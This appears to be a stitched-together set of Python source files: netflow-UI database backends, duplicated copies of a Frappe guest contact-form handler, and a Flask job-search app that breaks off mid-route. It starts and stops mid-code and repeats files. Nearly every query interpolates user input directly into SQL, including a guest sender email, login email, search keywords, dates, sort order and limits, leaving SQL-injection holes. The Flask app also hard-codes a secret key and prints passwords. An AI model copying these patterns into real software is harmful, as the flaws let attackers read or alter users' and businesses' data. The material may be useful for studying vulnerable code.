            SELECT regexp_matches(lower_title, '({query}\w*?(?:\s+\w+){{3}}|)\M', 'g') as match FROM s                    
        ) s_all
        group by match
        order by score desc, length(match::text) asc
        LIMIT 50;""".format(query=query)                    

    rows = db.engine.execute(sql.text(query_string)).fetchall()                    
    phrases = [{"phrase":row[0][0], "score":row[1]} for row in rows if row[0][0]]
    return phrases

from gfui.backends.default import Backend
import psycopg2
from gfui.chartgraph import Graph, Table
import re
import ipaddress
import os

class Timescaledb_backend(Backend):
    def __init__(self, OPTIONS):
        super().__init__()
        self.required_opts = ['SQL_SERVER', 'SQL_USERNAME', 'SQL_DB']
        self.parse_options(OPTIONS)
        self.columns = {}

        pw = os.environ.get("SQL_PASSWORD")
        if not pw:
            pw = self.OPTIONS['SQL_PASSWORD']

        self.db = psycopg2.connect(
            "dbname={0} user={1} password={2} host={3}".format(
                self.OPTIONS['SQL_DB'],
                self.OPTIONS['SQL_USERNAME'],
                pw,
                self.OPTIONS['SQL_SERVER']
            )
        )

        self.schema = Schema()

        self.filters = []

    def get_columns(self):
        return self.schema.get_columns()

    def add_filter(self, op, value):
        self.schema.add_filter(value, op)

    def get_int_columns(self):
        return self.schema.get_int_columns()

    def flow_table(self, limit=10):
        db = self.db
        self.schema.limit = limit
        FLOWS = self.schema.flows()

        cursor = db.cursor()                    
        cursor.execute(FLOWS)                    
        r = cursor.fetchall()
        t = Table()
        t = t.table_from_rows(r, self.schema.column_order)
        return t

    def topn_sum_graph(self, field, sum_by, limit=10):
        db = self.db
        self.schema.limit = limit
        FLOWS_PER_IP = self.schema.topn_sum(field, sum_by)

        cursor = db.cursor()                    
        cursor.execute(FLOWS_PER_IP)
        r = cursor.fetchall()
        g = Graph()
        g.name = "TopN {0}".format(field)
        g.set_headers([
            field,
            "Total"
        ])
        g.graph_from_rows(r, 0)
        return g

class Column:
    """
    Column

    Column handling class.
    Governs how query strings are built and helper functons for returned data.
    """
    def __init__(self, name, display_name=None):
        self.name = name
        self.display_name = display_name
        self.type = 'text'
        self.filter_string = None

    def get_display_name(self):
        return self.display_name

    def select(self):
        return "{0}".format(self.name)

    def filter(self, value, op=None):
        if self.filter_string:
            self.filter_string = self.filter_string + "AND {2} {0} \"{1}\"".format(op, value, self.name)
        else:
            self.filter_string = "{2} {0} \"{1}\"".format(op, value, self.name)

class IP4Column(Column):
    def __init__(self, name, display_name=None):
        super().__init__(name, display_name)
        self.type = "ip"

    def select(self):
        return "{0}".format(self.name)

    def filter(self, value, op=None):
        s = value.split("/")
        if len(s) > 1:
            self.filter_string = "({0} << '{1}'".format(self.name, value)
        else:
            self.filter_string = "{0} = '{1}'".format(self.name, value)

        return self.filter_string

class IP6Column(Column):
    def __init__(self, name, display_name=None):
        super().__init__(name, display_name)
        self.type = "ip6"

    def select(self):
        return "{0}".format(self.name)

    def filter(self, value, op=None):
        s = value.split("/")
        if len(s) > 1:
            ip = ipaddress.ip_network(value, strict=False)
            start_ip = ip.network_address
            end_ip = ip.broadcast_address
            self.filter_string = "({0} > {1} AND {0} < {2})".format(self.name, int(start_ip), int(end_ip))
        else:
            ip = ipaddress.ip_address(value)
            self.filter_string = "{0} = {1}".format(self.name, int(ip))

        return self.filter_string

class IntColumn(Column):
    def __init__(self, name, display_name=None):
        super().__init__(name, display_name)
        self.type = 'int'

    def select(self):
        return "{0}".format(self.name)

    def filter(self, value, op=None):
        self.filter_string = "{0} = {1}".format(self.name, value)                    
        return self.filter_string

class PortColumn(Column):
    def __init__(self, name, display_name=None):
        super().__init__(name, display_name)
        self.type = 'port'

    def select(self):
        return "{0}".format(self.name)

    def filter(self, value, op=None):
        self.filter_string = "{0} = {1}".format(self.name, value)                    
        return self.filter_string

class Coalesce:
    def __init__(self, name, columns, filter_func, display_name):
        """
        Coalesce
        Select from a list of columns whatever is not null
        :param columns (List): Column objects
        """
        self.name = name
        self.columns = columns
        # We assume that the passed columns are of roughly the same type
        self.type = columns[0].type
        self.column_selects = []
        for c in columns:
            self.column_selects.append(c.select())

        self.filter_string = None
        self.filter_func = filter_func
        self.display_name = display_name

    def get_display_name(self):
        return self.display_name

    def select(self):
        fields = ", ".join(self.column_selects)
        return "COALESCE({0}) AS {1}".format(fields, self.name)

    def filter(self, value, op=None):
        self.filter_string = self.filter_func(value, op)

class Schema:
    """
    Schema

    Defines the backend schema
    Changes to the backend (naming, etc.) should be reflected here.
    """
    def __init__(self):
        # Default
        self.limit = 10

        self.column_order = [
            "last_switched",
            "src_ip",
            "src_port",
            "dst_ip",
            "dst_port",
            "in_bytes",
        ]
        src_ip_col = IP4Column("src_ip", "Source IP")
        src_ipv6_col = IP6Column("src_ipv6", "Source IPv6")
        dst_ip_col = IP4Column("dst_ip", "Destination IP")
        dst_ipv6_col = IP6Column("dst_ipv6", "DestinationIPv6")

        # Filter tuples are filter values
        self.filter_tuples = ()                    

        # Columns
        self.columns = {
            "last_switched": Column("last_switched", "Last Switched"),
            "src_ip": Coalesce("src_c_ip", [src_ip_col, src_ipv6_col], src_ip_col.filter, "Source IP"),
            "src_port": PortColumn("src_port", "Source Port"),
            "dst_ip": Coalesce("dst_c_ip", [dst_ip_col, dst_ipv6_col], dst_ip_col.filter, "Destination IP"),
            "dst_port": PortColumn("dst_port", "Destination Port"),
            "in_bytes": IntColumn("in_bytes", "Input bytes"),
            "in_pkts": IntColumn("in_pkts", "Input Packets"),
        }

        # Supported queries
        self.QUERIES = {
            "TOPN": self.topn
        }

        self.filters = []

        self.filter_map = {
            "(\d+\-\d+\-\d+)": "last_switched",
            "src (\d+\.\d+\.\d+\.\d+\/\d+|\d+\.\d+\.\d+\.\d+)": "src_ip",
            "dst (\d+\.\d+\.\d+\.\d+\/\d+|\d+\.\d+\.\d+\.\d+)": "dst_ip",
            "src ([0-9]+)($|\s)": "src_port",
            "dst ([0-9]+)($|\s)": "dst_port",
        }

    def add_filter(self, value, op="="):
        for regex, column in self.filter_map.items():
            if re.search(regex, value):
                m = re.search(regex, value)
                v = m.group(1)
                self.columns[column].filter(v, op)

    def build_filter_string(self):
        s = 'WHERE '
        l = []
        for c in self.columns.values():
            if c.filter_string:
                l.append(c.filter_string)

        if len(l) > 0:
            return s + " AND ".join(l)
        else:
            return ''

    def get_columns(self):
        result = {}
        for col_name, col in self.columns.items():
            result[col_name] = col.get_display_name()

        return result

    def get_int_columns(self):
        result = {}
        for col_name, col in self.columns.items():
            if col.type is "int":
                result[col_name] = col.get_display_name()

        return result

    def topn(self, column):
        count = "last_switched"
        q = """
        SELECT {0}, count({1}) AS c FROM goflow_records {2} GROUP BY {0} ORDER BY c DESC
        """.format(self.columns[column].select(), count, self.build_filter_string())
        return self.query_boilerplate(q)

    def topn_sum(self, column, sum_by):
        q = """
        SELECT {0}, sum({1}) AS c FROM goflow_records {2} GROUP BY {3} ORDER BY c DESC
        """.format(self.columns[column].select(), sum_by, self.build_filter_string(), self.columns[column].name)
        return self.query_boilerplate(q)

    def flows(self):
        c = []
        for col in self.column_order:
            c.append(self.columns[col].select())
        q = """
        SELECT {1} FROM goflow_records {0} ORDER BY last_switched DESC
        """.format(self.build_filter_string(), ", ".join(c))
        return self.query_boilerplate(q)

    def query_boilerplate(self, q):
        q = q + """LIMIT {0}""".format(self.limit)
        return q

    def query(self, db, q):
        cursor = db.cursor()                    
        cursor.execute(q, self.filter_tuples)                    

from gfui.backends.default import Backend
import mysql.connector
from gfui.chartgraph import Graph, Table
import re
import ipaddress
import os

class Mysql_backend(Backend):
    def __init__(self, OPTIONS):
        super().__init__()
        self.required_opts = ['SQL_SERVER', 'SQL_USERNAME', 'SQL_DB']
        self.parse_options(OPTIONS)
        self.columns = {}

        pw = os.environ.get("SQL_PASSWORD")
        if not pw:
            pw = self.OPTIONS['SQL_PASSWORD']

        self.db = mysql.connector.connect(
            host=self.OPTIONS['SQL_SERVER'],
            user=self.OPTIONS['SQL_USERNAME'],
            passwd=pw                    
        )

        self.schema = Schema()

        self.filters = []

    def get_columns(self):
        return self.schema.get_columns()

    def add_filter(self, op, value):
        self.schema.add_filter(value, op)

    def get_int_columns(self):
        return self.schema.get_int_columns()

    def flow_table(self, limit=10):
        db = self.db
        self.schema.limit = limit
        FLOWS = self.schema.flows()                    

        cursor = db.cursor()                    
        cursor.execute("USE testgoflow")                    
        cursor.execute(FLOWS)                    
        r = cursor.fetchall()
        t = Table()
        t = t.table_from_rows(r, self.schema.column_order)
        return t

    def topn_sum_graph(self, field, sum_by, limit=10):
        db = self.db
        self.schema.limit = limit
        FLOWS_PER_IP = self.schema.topn_sum(field, sum_by)

        cursor = db.cursor()                    
        cursor.execute("USE testgoflow")                    
        cursor.execute(FLOWS_PER_IP)
        r = cursor.fetchall()
        g = Graph()
        g.name = "TopN {0}".format(field)
        g.set_headers([
            field,
            "Total"
        ])
        g.graph_from_rows(r, 0)
        return g

class Column:
    """
    Column

    Column handling class.
    Governs how query strings are built and helper functons for returned data.
    """
    def __init__(self, name, display_name=None):
        self.name = name
        self.display_name = display_name
        self.type = 'text'
        self.filter_string = None

    def get_display_name(self):
        return self.display_name

    def select(self):
        return "{0}".format(self.name)

    def filter(self, value, op=None):
        if self.filter_string:
            self.filter_string = self.filter_string + "AND {2} {0} \"{1}\"".format(op, value, self.name)
        else:
            self.filter_string = "{2} {0} \"{1}\"".format(op, value, self.name)

class IP4Column(Column):
    def __init__(self, name, display_name=None):
        super().__init__(name, display_name)
        self.type = "ip"

    def select(self):
        return "inet_ntoa({0})".format(self.name)

    def filter(self, value, op=None):
        s = value.split("/")
        if len(s) > 1:
            ip = ipaddress.ip_network(value, strict=False)
            start_ip = ip.network_address
            end_ip = ip.broadcast_address
            self.filter_string = "({0} > {1} AND {0} < {2})".format(self.name, int(start_ip), int(end_ip))
        else:
            ip = ipaddress.ip_address(value)
            self.filter_string = "{0} = {1}".format(self.name, int(ip))

        return self.filter_string

class IP6Column(Column):
    def __init__(self, name, display_name=None):
        super().__init__(name, display_name)
        self.type = "ip6"

    def select(self):
        return "inet6_ntoa({0})".format(self.name)

    def filter(self, value, op=None):
        s = value.split("/")
        if len(s) > 1:
            ip = ipaddress.ip_network(value, strict=False)
            start_ip = ip.network_address
            end_ip = ip.broadcast_address
            self.filter_string = "({0} > {1} AND {0} < {2})".format(self.name, int(start_ip), int(end_ip))
        else:
            ip = ipaddress.ip_address(value)
            self.filter_string = "{0} = {1}".format(self.name, int(ip))

        return self.filter_string

class IntColumn(Column):
    def __init__(self, name, display_name=None):
        super().__init__(name, display_name)
        self.type = 'int'

    def select(self):
        return "{0}".format(self.name)

    def filter(self, value, op=None):
        self.filter_string = "{0} = {1}".format(self.name, value)                    
        return self.filter_string

class PortColumn(Column):
    def __init__(self, name, display_name=None):
        super().__init__(name, display_name)
        self.type = 'port'

    def select(self):
        return "{0}".format(self.name)

    def filter(self, value, op=None):
        self.filter_string = "{0} = {1}".format(self.name, value)                    
        return self.filter_string

class Coalesce:
    def __init__(self, name, columns, filter_func, display_name):
        """
        Coalesce
        Select from a list of columns whatever is not null
        :param columns (List): Column objects
        """
        self.name = name
        self.columns = columns
        # We assume that the passed columns are of roughly the same type
        self.type = columns[0].type
        self.column_selects = []
        for c in columns:
            self.column_selects.append(c.select())

        self.filter_string = None
        self.filter_func = filter_func
        self.display_name = display_name

    def get_display_name(self):
        return self.display_name

    def select(self):
        fields = ", ".join(self.column_selects)
        return "COALESCE({0}) AS {1}".format(fields, self.name)

    def filter(self, value, op=None):
        self.filter_string = self.filter_func(value, op)
        print(self.filter_string)                    

class Schema:
    """
    Schema

    Defines the backend schema
    Changes to the backend (naming, etc.) should be reflected here.
    """
    def __init__(self):
        # Default
        self.limit = 10

        self.column_order = [
            "last_switched",
            "src_ip",
            "src_port",
            "dst_ip",
            "dst_port",
            "in_bytes",
        ]
        src_ip_col = IP4Column("src_ip", "Source IP")
        src_ipv6_col = IP6Column("src_ipv6", "Source IPv6")
        dst_ip_col = IP4Column("dst_ip", "Destination IP")
        dst_ipv6_col = IP6Column("dst_ipv6", "DestinationIPv6")

        # Columns
        self.columns = {
            "last_switched": Column("last_switched", "Last Switched"),
            "src_ip": Coalesce("src_c_ip", [src_ip_col, src_ipv6_col], src_ip_col.filter, "Source IP"),
            "src_port": PortColumn("src_port", "Source Port"),
            "dst_ip": Coalesce("dst_c_ip", [dst_ip_col, dst_ipv6_col], dst_ip_col.filter, "Destination IP"),
            "dst_port": PortColumn("dst_port", "Destination Port"),
            "in_bytes": IntColumn("in_bytes", "Input bytes"),
            "in_pkts": IntColumn("in_pkts", "Input Packets"),
        }

        # Supported queries
        self.QUERIES = {
            "TOPN": self.topn
        }

        self.filters = []

        self.filter_map = {
            "(\d+\-\d+\-\d+)": "last_switched",
            "src (\d+\.\d+\.\d+\.\d+\/\d+|\d+\.\d+\.\d+\.\d+)": "src_ip",
            "dst (\d+\.\d+\.\d+\.\d+\/\d+|\d+\.\d+\.\d+\.\d+)": "dst_ip",
            "src ([0-9]+)($|\s)": "src_port",
            "dst ([0-9]+)($|\s)": "dst_port",
        }

    def add_filter(self, value, op="="):
        for regex, column in self.filter_map.items():
            if re.search(regex, value):
                m = re.search(regex, value)
                v = m.group(1)
                self.columns[column].filter(v, op)

    def build_filter_string(self):
        s = 'WHERE '
        l = []
        for c in self.columns.values():
            if c.filter_string:
                l.append(c.filter_string)

        if len(l) > 0:
            return s + " AND ".join(l)
        else:
            return ''

    def get_columns(self):
        result = {}
        for col_name, col in self.columns.items():
            result[col_name] = col.get_display_name()

        return result

    def get_int_columns(self):
        result = {}
        for col_name, col in self.columns.items():
            if col.type is "int":
                result[col_name] = col.get_display_name()

        return result

    def topn(self, column):
        count = "last_switched"
        q = """
        SELECT {0}, count({1}) AS c FROM goflow_records {2} GROUP BY {0} ORDER BY c DESC
        """.format(self.columns[column].select(), count, self.build_filter_string())
        return self.query_boilerplate(q)

    def topn_sum(self, column, sum_by):
        q = """
        SELECT {0}, sum({1}) AS c FROM test_goflow_records {2} GROUP BY {3} ORDER BY c DESC
        """.format(self.columns[column].select(), sum_by, self.build_filter_string(), self.columns[column].name)
        print(q)                    
        return self.query_boilerplate(q)

    def flows(self):
        c = []
        for col in self.column_order:
            c.append(self.columns[col].select())
        q = """
        SELECT {1} FROM goflow_records {0} ORDER BY last_switched DESC
        """.format(self.build_filter_string(), ", ".join(c))
        print(q)                    
        return self.query_boilerplate(q)

    def query_boilerplate(self, q):
        q = q + """LIMIT {0}""".format(self.limit)
        return q

from gfui.backends.default import Backend
import psycopg2
from gfui.chartgraph import Graph, Table
import re
import ipaddress
import os

class Timescaledb_backend(Backend):
    def __init__(self, OPTIONS):
        super().__init__()
        self.required_opts = ['SQL_SERVER', 'SQL_USERNAME', 'SQL_DB']
        self.parse_options(OPTIONS)
        self.columns = {}

        pw = os.environ.get("SQL_PASSWORD")
        if not pw:
            pw = self.OPTIONS['SQL_PASSWORD']

        self.db = psycopg2.connect(
            "dbname={0} user={1} password={2} host={3}".format(
                self.OPTIONS['SQL_DB'],
                self.OPTIONS['SQL_USERNAME'],
                pw,
                self.OPTIONS['SQL_SERVER']
            )
        )

        self.schema = Schema()

        self.filters = []

    def get_columns(self):
        return self.schema.get_columns()

    def add_filter(self, op, value):
        self.schema.add_filter(value, op)

    def get_int_columns(self):
        return self.schema.get_int_columns()

    def flow_table(self, limit=10):
        db = self.db
        self.schema.limit = limit
        FLOWS = self.schema.flows()

        cursor = self.schema.query(db, FLOWS)
        r = cursor.fetchall()
        t = Table()
        t = t.table_from_rows(r, self.schema.column_order)
        return t

    def topn_sum_graph(self, field, sum_by, limit=10):
        db = self.db
        self.schema.limit = limit
        FLOWS_PER_IP = self.schema.topn_sum(field, sum_by)

        cursor = db.cursor()                    
        cursor.execute(FLOWS_PER_IP)                    
        r = cursor.fetchall()
        g = Graph()
        g.name = "TopN {0}".format(field)
        g.set_headers([
            field,
            "Total"
        ])
        g.graph_from_rows(r, 0)
        return g

class Column:
    """
    Column

    Column handling class.
    Governs how query strings are built and helper functons for returned data.
    """
    def __init__(self, name, display_name=None):
        self.name = name
        self.display_name = display_name
        self.type = 'text'
        self.filter_string = None

    def get_display_name(self):
        return self.display_name

    def select(self):
        return "{0}".format(self.name)

    def filter(self, value, op=None):
        if self.filter_string:
            self.filter_string = self.filter_string + "AND {2} {0} \"{1}\"".format(op, value, self.name)
        else:
            self.filter_string = "{2} {0} \"{1}\"".format(op, value, self.name)

class IP4Column(Column):
    def __init__(self, name, display_name=None):
        super().__init__(name, display_name)
        self.type = "ip"

    def select(self):
        return "{0}".format(self.name)

    def filter(self, value, op=None):
        s = value.split("/")
        if len(s) > 1:
            self.filter_string = "({0} << '{1}'".format(self.name, value)                    
        else:
            self.filter_string = "{0} = '{1}'".format(self.name, value)                    

        return self.filter_string

class IP6Column(Column):
    def __init__(self, name, display_name=None):
        super().__init__(name, display_name)
        self.type = "ip6"

    def select(self):
        return "{0}".format(self.name)

    def filter(self, value, op=None):
        s = value.split("/")
        if len(s) > 1:
            ip = ipaddress.ip_network(value, strict=False)                    
            start_ip = ip.network_address                    
            end_ip = ip.broadcast_address                    
            self.filter_string = "({0} > {1} AND {0} < {2})".format(self.name, int(start_ip), int(end_ip))                    
        else:
            ip = ipaddress.ip_address(value)                    
            self.filter_string = "{0} = {1}".format(self.name, int(ip))                    

        return self.filter_string

class IntColumn(Column):
    def __init__(self, name, display_name=None):
        super().__init__(name, display_name)
        self.type = 'int'

    def select(self):
        return "{0}".format(self.name)

    def filter(self, value, op=None):
        self.filter_string = "{0} = {1}".format(self.name, value)
        return self.filter_string

class PortColumn(Column):
    def __init__(self, name, display_name=None):
        super().__init__(name, display_name)
        self.type = 'port'

    def select(self):
        return "{0}".format(self.name)

    def filter(self, value, op=None):
        self.filter_string = "{0} = %s".format(self.name, value)
        return self.filter_string

class Coalesce:
    def __init__(self, name, columns, filter_func, display_name):
        """
        Coalesce
        Select from a list of columns whatever is not null
        :param columns (List): Column objects
        """
        self.name = name
        self.columns = columns
        # We assume that the passed columns are of roughly the same type
        self.type = columns[0].type
        self.column_selects = []
        for c in columns:
            self.column_selects.append(c.select())

        self.filter_string = None
        self.filter_func = filter_func
        self.display_name = display_name

    def get_display_name(self):
        return self.display_name

    def select(self):
        fields = ", ".join(self.column_selects)
        return "COALESCE({0}) AS {1}".format(fields, self.name)

    def filter(self, value, op=None):
        self.filter_string = self.filter_func(value, op)

class Schema:
    """
    Schema

    Defines the backend schema
    Changes to the backend (naming, etc.) should be reflected here.
    """
    def __init__(self):
        # Default
        self.limit = 10

        self.column_order = [
            "last_switched",
            "src_ip",
            "src_port",
            "dst_ip",
            "dst_port",
            "in_bytes",
        ]
        src_ip_col = IP4Column("src_ip", "Source IP")
        src_ipv6_col = IP6Column("src_ipv6", "Source IPv6")
        dst_ip_col = IP4Column("dst_ip", "Destination IP")
        dst_ipv6_col = IP6Column("dst_ipv6", "DestinationIPv6")

        self.filter_val_list = []

        # Columns
        self.columns = {
            "last_switched": Column("last_switched", "Last Switched"),
            "src_ip": Coalesce("src_c_ip", [src_ip_col, src_ipv6_col], src_ip_col.filter, "Source IP"),
            "src_port": PortColumn("src_port", "Source Port"),
            "dst_ip": Coalesce("dst_c_ip", [dst_ip_col, dst_ipv6_col], dst_ip_col.filter, "Destination IP"),
            "dst_port": PortColumn("dst_port", "Destination Port"),
            "in_bytes": IntColumn("in_bytes", "Input bytes"),
            "in_pkts": IntColumn("in_pkts", "Input Packets"),
        }

        # Supported queries
        self.QUERIES = {
            "TOPN": self.topn
        }

        self.filters = []

        self.filter_map = {
            "(\d+\-\d+\-\d+)": "last_switched",
            "src (\d+\.\d+\.\d+\.\d+\/\d+|\d+\.\d+\.\d+\.\d+)": "src_ip",
            "dst (\d+\.\d+\.\d+\.\d+\/\d+|\d+\.\d+\.\d+\.\d+)": "dst_ip",
            "src ([0-9]+)($|\s)": "src_port",
            "dst ([0-9]+)($|\s)": "dst_port",
        }

    def add_filter(self, value, op="="):
        for regex, column in self.filter_map.items():
            if re.search(regex, value):
                m = re.search(regex, value)
                v = m.group(1)
                self.columns[column].filter(v, op)
                self.filter_val_list.append(v)

    def build_filter_string(self):
        s = 'WHERE '
        l = []
        for c in self.columns.values():
            if c.filter_string:
                l.append(c.filter_string)

        if len(l) > 0:
            return s + " AND ".join(l)
        else:
            return ''

    def get_columns(self):
        result = {}
        for col_name, col in self.columns.items():
            result[col_name] = col.get_display_name()

        return result

    def get_int_columns(self):
        result = {}
        for col_name, col in self.columns.items():
            if col.type is "int":
                result[col_name] = col.get_display_name()

        return result

    def topn(self, column):
        count = "last_switched"
        q = """
        SELECT {0}, count({1}) AS c FROM goflow_records {2} GROUP BY {0} ORDER BY c DESC
        """.format(self.columns[column].select(), count, self.build_filter_string())
        return self.query_boilerplate(q)

    def topn_sum(self, column, sum_by):
        q = """
        SELECT {0}, sum({1}) AS c FROM goflow_records {2} GROUP BY {3} ORDER BY c DESC
        """.format(self.columns[column].select(), sum_by, self.build_filter_string(), self.columns[column].name)
        return self.query_boilerplate(q)

    def flows(self):
        c = []
        for col in self.column_order:
            c.append(self.columns[col].select())
        q = """
        SELECT {1} FROM goflow_records {0} ORDER BY last_switched DESC
        """.format(self.build_filter_string(), ", ".join(c))
        return self.query_boilerplate(q)

    def query_boilerplate(self, q):
        q = q + """LIMIT {0}""".format(self.limit)
        return q

    def query(self, db, q):
        cursor = db.cursor()                    
        cursor.execute(q, self.filter_val_list)
        return cursor

# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# License: GNU General Public License v3. See license.txt

from __future__ import unicode_literals

import frappe, json
from frappe import _
from frappe.utils import cint, formatdate

@frappe.whitelist(allow_guest=True)
def send_message(subject="Website Query", message="", sender="", status="Open"):
	from frappe.www.contact import send_message as website_send_message
	lead = customer = None

	website_send_message(subject, message, sender)

	customer = frappe.db.sql("""select distinct dl.link_name from `tabDynamic Link` dl
		left join `tabContact` c on dl.parent=c.name where dl.link_doctype='Customer'
		and c.email_id='{email_id}'""".format(email_id=sender))                    

	if not customer:
		lead = frappe.db.get_value('Lead', dict(email_id=sender))
		if not lead:
			new_lead = frappe.get_doc(dict(
				doctype='Lead',
				email_id = sender,
				lead_name = sender.split('@')[0].title()
			)).insert(ignore_permissions=True)

	opportunity = frappe.get_doc(dict(
		doctype ='Opportunity',
		enquiry_from = 'Customer' if customer else 'Lead',
		status = 'Open',
		title = subject,
		contact_email = sender,
		to_discuss = message
	))

	if customer:
		opportunity.customer = customer[0][0]
	elif lead:
		opportunity.lead = lead
	else:
		opportunity.lead = new_lead.name

	opportunity.insert(ignore_permissions=True)

	comm = frappe.get_doc({
		"doctype":"Communication",
		"subject": subject,
		"content": message,
		"sender": sender,
		"sent_or_received": "Received",
		'reference_doctype': 'Opportunity',
		'reference_name': opportunity.name
	})
	comm.insert(ignore_permissions=True)

	return "okay"

# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# License: GNU General Public License v3. See license.txt

from __future__ import unicode_literals

import frappe, json
from frappe import _
from frappe.utils import cint, formatdate

@frappe.whitelist(allow_guest=True)
def send_message(subject="Website Query", message="", sender="", status="Open"):
	from frappe.www.contact import send_message as website_send_message
	lead = customer = None

	website_send_message(subject, message, sender)

	customer = frappe.db.sql("""select distinct dl.link_name from `tabDynamic Link` dl
		left join `tabContact` c on dl.parent=c.name where dl.link_doctype='Customer'
		and c.email_id='{email_id}'""".format(email_id=sender))                    

	if not customer:
		lead = frappe.db.get_value('Lead', dict(email_id=sender))
		if not lead:
			new_lead = frappe.get_doc(dict(
				doctype='Lead',
				email_id = sender,
				lead_name = sender.split('@')[0].title()
			)).insert(ignore_permissions=True)

	opportunity = frappe.get_doc(dict(
		doctype ='Opportunity',
		enquiry_from = 'Customer' if customer else 'Lead',
		status = 'Open',
		title = subject,
		contact_email = sender,
		to_discuss = message
	))

	if customer:
		opportunity.customer = customer[0][0]
	elif lead:
		opportunity.lead = lead
	else:
		opportunity.lead = new_lead.name

	opportunity.insert(ignore_permissions=True)

	comm = frappe.get_doc({
		"doctype":"Communication",
		"subject": subject,
		"content": message,
		"sender": sender,
		"sent_or_received": "Received",
		'reference_doctype': 'Opportunity',
		'reference_name': opportunity.name
	})
	comm.insert(ignore_permissions=True)

	return "okay"

import os
from sqlalchemy import *
from flask import Flask, request, render_template, g, redirect, Response, flash, url_for, session
from flask_login import LoginManager, login_user, login_required, logout_user, current_user
from Database import engine
from User import User

# set app and login system
tmpl_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')
app = Flask(__name__, template_folder=tmpl_dir)
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = "login"
app.secret_key = 'I love database'


# Get current user's information
@login_manager.user_loader
def load_user(s_id):
    email = str(s_id)
    query = '''select * from usr where email like\'''' + email + '\''                    
    cursor = g.conn.execute(query)                    
    user = User()
    for row in cursor:
        user.name = str(row.name)
        user.email = str(row.email)
        break
    return user


# Prepare the page
@app.before_request
def before_request():
  try:
    g.conn = engine.connect()
  except:
    print "uh oh, problem connecting to database"
    import traceback; traceback.print_exc()
    g.conn = None


@app.teardown_request
def teardown_request(exception):
  try:
    g.conn.close()
  except Exception:
    pass


# @The function for user login
@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    page = 'login'
    if request.method == 'POST':

        # Obtain input value and pass to User object
        email = str(request.form['email']).strip()
        password = str(request.form['password']).strip()
        user = User(email, password)
        user.user_verify()

        if not user.valid:
            error = 'Invalid login information'
        else:
            session['logged_in'] = True
            login_user(user)
            print current_user.id
            flash('You were logged in')
            g.user = current_user.id
            return redirect(url_for('user_home_page'))

    return render_template('login.html', error=error, page=page)


# @This function is for user sign-up
@app.route("/signup", methods=["GET", "POST"])
def signup():
    error = None
    page = 'signup'
    if request.method == 'POST':
        name = str(request.form['username']).strip()
        password = str(request.form['password']).strip()
        email = str(request.form['email']).strip()
        print name, password, email
        newuser = User(email, password, name)
        newuser.insert_new_user()
        if not newuser.valid:
            error = 'Invalid user information, please choose another one'
        else:
            session['logged_in'] = True
            login_user(newuser)
            flash('Thanks for signing up, you are now logged in')
            return redirect(url_for('user_home_page'))
    return render_template('signup.html', error=error, page=page)


@app.route("/logout")
@login_required
def logout():
    session.pop('logged_in', None)
    logout_user()
    return redirect(url_for('login'))


'''
This part is the User Homepage, add app functions here
Modify user_home_page.html as well
'''


@app.route("/", methods=["GET", "POST"])
@login_required
def user_home_page():
    message = "Welcome back! " + current_user.name
    if request.method == 'GET':
        query = '''
        select tmp.jid as id, tmp.name as name, tmp.type as type,
               tmp.sal_from as sfrom, tmp.sal_to as sto, 
               tmp.sal_freq as sfreq, tmp.posting_time as ptime
        from (vacancy v natural join job j) as tmp, application ap
        where ap.uemail = \'''' + session["user_id"] + '\' and ap.jid = tmp.jid and ap.vtype = tmp.type'                    
        cursor = g.conn.execute(text(query))                    
        data = cursor.fetchall()
        return render_template("user_home_page.html", message = message, data = data)
    return render_template("user_home_page.html", message = message)


# @Search vacancy with keyword
@app.route("/search", methods=["GET", "POST"])
@login_required
def search_vacancy():
    if request.method == 'POST':
        key = str(request.form['keyword']).strip()
        if not key:
            return render_template("search.html")
        attr = request.form.get('attr')
        ptf = str(request.form['pt_from']).strip()  # posting time from
        ptt = str(request.form['pt_to']).strip()  # posting time from
        order = request.form.get('order')
        order_attr = request.form.get('order_attr')
        limit = str(request.form['limit']).strip()
        query = '''
        select j.jid as id, j.name as name, v.type as type,
               v.sal_from as sfrom, v.sal_to as sto, 
               v.sal_freq as sfreq ,v.posting_time as ptime
        from vacancy as v inner join job as j on v.jid = j.jid
        '''
        if ptf and ptt:
            query += 'where v.posting_time>=\'' + ptf + '\' and v.posting_time<=\'' + ptt + '\' and '                    
        elif ptf and not ptt:
            query += 'where v.posting_time>=\'' + ptf + '\' and '                    
        elif not ptf and ptt:
            query += 'where v.posting_time<=\'' + ptt + '\' and '                    
        else:
            query += 'where '
        
        if attr == 'name':
            query += 'lower(j.name) like lower(\'%' + key + '%\') '    # use lower() to ignore case 
        elif attr == 'salary':
            query += 'v.sal_from <= ' + key + ' and v.sal_to >=' + key + ' '                    
        elif attr == 'skill':
            query += 'j.pre_skl like \'%' + key + '%\' or j.job_des like \'%''' + key + '%\' '                    
        
        if order_attr == 'pt':
            query += 'order by v.posting_time ' + order
        elif order_attr == 'id':
            query += 'order by j.jid ' + order
        elif order_attr == 'name':
            query += 'order by j.name ' + order
        elif order_attr == 'lows':
            query += 'order by v.sal_from ' + order
        elif order_attr == 'highs':
            query += 'order by v.sal_to ' + order
        
        if limit and limit != 'all':
            query += ' limit ' + limit                    
        cursor = g.conn.execute(text(query))  # !Very important here, must convert type text()                    
        job = []
        for row in cursor:
            job.append(row)
        data = job
        return render_template("search.html", data=data, keyword = key)
    return render_template("search.html")

# detailed info of a vacancy
@app.route("/detailed_info", methods=["GET", "POST"])
@login_required
def detailed_info():
    if request.method == 'POST':
        jid = request.form.get('jid')
        vtype = request.form.get('vtype')
        query = '''
        select *
        from vacancy v natural join job j
        where j.jid=''' + jid + ' and v.type=\'' + vtype +'\''
        cursor = g.conn.execute(text(query))                    
        data = cursor.fetchall()
        col_names = ['JID', 'Type', '# Positions', 'Salary from', 'Salary to', 'Salary Frequency', 'Post Until', 'Posting Time', 'Updated Time', 'Unit', 'Agency', 'Level', 'Job Name', 'Preferred Skills', 'Job Description', 'Location', 'Hour/Shift', 'Title code', 'Civil Service TiTle']  # column header
        return render_template("detailed_info.html", zippedlist = zip(col_names, data[0]), jid = jid, vtype = vtype) # zip to help us iterate two lists parallelly
    return render_template("detailed_info.html")

# apply for the vacancy
@app.route("/apply", methods=["GET", "POST"])
@login_required
def apply():
    if request.method == 'POST':
        jid = request.form.get('jid')
        vtype = request.form.get('vtype')
